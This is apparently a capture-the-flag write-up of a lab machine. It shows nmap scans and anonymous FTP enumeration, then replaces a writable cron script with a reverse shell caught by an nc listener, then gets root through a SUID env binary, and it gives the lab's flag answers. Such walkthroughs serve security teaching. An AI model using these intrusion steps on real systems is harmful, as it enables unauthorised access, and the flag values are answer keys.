---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Pwn
### Enumerate the machine. How many ports are open?

Let's perform a simple `nmap` scan against the target machine.

```
$ nmap -p- 10.10.94.176 -T5
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-02 20:19 IST
Warning: 10.10.94.176 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.94.176
Host is up (0.13s latency).
Not shown: 65503 closed tcp ports (conn-refused), 28 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 530.35 seconds
```

We can now perform an in-depth scan only on the open ports.

```
$ nmap -A -p 21,22,139,445 10.10.94.176    
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-02 20:30 IST
Nmap scan report for 10.10.94.176
Host is up (0.14s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.48.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-02-02T15:00:15
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-02-02T15:00:15+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
```

There are four open ports:


| Port | Service |
| :-: | :-: |
| 21   | ftp        |
| 22   | ssh        |
| 139  | netbios-ssn (smbd)        |
| 445     | netbios-ssn (smbd)        |


### Answer
```
4
```

&nbsp;

### What service is running on port 21?
### Answer
```
ftp
```

&nbsp;

### What service is running on ports 139 and 445?
### Answer
```
smb
```

&nbsp;

### There's a share on the user's computer.  What's it called?

We can list out the SMB shares on the target using `smbclient`.

```
$ smbclient -L 10.10.94.176
Password for [WORKGROUP\kunal]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

```
### Answer
```
pics
```

&nbsp;

### user.txt

Looking back at our `nmap` scan, we can see that anonymous login is allowed on the FTP server.

```
$ ftp anonymous@10.10.94.176                                                                             
Connected to 10.10.94.176.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Let's perform some enumeration on the server.

```
ftp> ls
229 Entering Extended Passive Mode (|||29364|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||33846|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1892 Feb 02 15:09 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

We can use the `get` command to download the files from the FTP server to our attacker machine.

```
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||21714|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |***********************************************************************************************************************************************************************************************|   314      206.21 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (2.27 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||60721|)
150 Opening BINARY mode data connection for removed_files.log (1935 bytes).
100% |***********************************************************************************************************************************************************************************************|  1935        5.91 MiB/s    00:00 ETA
226 Transfer complete.
1935 bytes received in 00:00 (14.36 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||5508|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |***********************************************************************************************************************************************************************************************|    68      335.38 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.51 KiB/s)
```

Let's `cat`out the `removed_files.log` file.

```
$ cat removed_files.log    
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

Let's check the `clean.sh` script next.

```
$ cat clean.sh         
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

So it seems like this script is a cronjob that runs after a particular time interval and adds the output into the ``removed_files.log` file.

In that case we can replace the content of the file to a reverse shell in order to obtain a shell on the target machine. We can get the script from Pentest Monkey.

![1](https://github.com/Knign/Write-ups/assets/110326359/dbccddc3-bde9-4aab-b2d1-f7db50e37bbd)


![2](https://github.com/Knign/Write-ups/assets/110326359/2473fd0f-7229-4715-919f-5037d31d1561)


Once the `clean.sh` file has been modified, we can log back into the FTP server and upload the file using the `put` command.

```
$ ftp anonymous@10.10.94.176
Connected to 10.10.94.176.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||24116|)
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|    56        0.05 KiB/s    --:-- ETA
226 Transfer complete.
56 bytes sent in 00:00 (0.21 KiB/s)
```

Now all we have to do is set up a `nc` listener and wait.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
```

After a while we would have connected to the target machine using our reverse shell.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.94.176] 42680
bash: cannot set terminal process group (1476): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
```

Let's get the user.txt flag.

```
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt 
90d6f992585815ff991e68748c414740
```
### Answer
```
90d6f992585815ff991e68748c414740
```

&nbsp;

### root.txt

Let's search for files with the SUID bit set.

```
namelessone@anonymous:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

For this particular lab we will be using the `/usr/bin/env` to escalate our privileges. The exploit can be found on GTFOBins.

![3](https://github.com/Knign/Write-ups/assets/110326359/45ea66cb-5cb7-4efa-b0fe-9b908c9d929a)

Let's use the exploit.

```
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p
bash-4.4# id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We can now read the root flag.

```
bash-4.4# cat /root/root.txt
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```
### Answer
```
4d930091c31a622a7ed10f27999af363
```
